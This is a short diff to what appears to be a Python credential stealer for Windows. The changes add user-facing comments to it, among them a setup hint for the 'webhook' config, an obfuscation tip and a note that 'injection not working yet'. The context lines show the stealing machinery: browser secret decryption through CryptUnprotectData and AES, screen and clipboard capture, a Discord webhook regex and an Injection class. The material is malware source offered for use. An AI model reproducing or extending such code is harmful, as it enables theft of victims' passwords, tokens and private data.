@@ -1,3 +1,4 @@
+#imports (when you are obfuscating your code you must leave imports untouched)
 import base64
 import concurrent.futures
 import ctypes
@@ -14,14 +15,13 @@ from ctypes import wintypes
 from multiprocessing import cpu_count
 from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
-
 import psutil
 import requests
 from Cryptodome.Cipher import AES
 from PIL import Image, ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
-
+#config - you can setup only features that interesting you to not have a mess at your webhook
 __CONFIG__ = {
     "webhook": "YOUR WEBHOOK HERE",
     "ping": True,
@@ -46,7 +46,7 @@ __CONFIG__ = {
     "clipboard": False
 }
 
-#global
+#global variables
 temp = os.getenv("temp")
 regex = "https://discord.com/api/webhooks"
 temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
@@ -866,7 +866,7 @@ class Clipboard:
                 with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
                     file.write("Clipboard is empty")
 
-
+#injection not working yet
 class Injection:
     def __init__(self, webhook: str) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
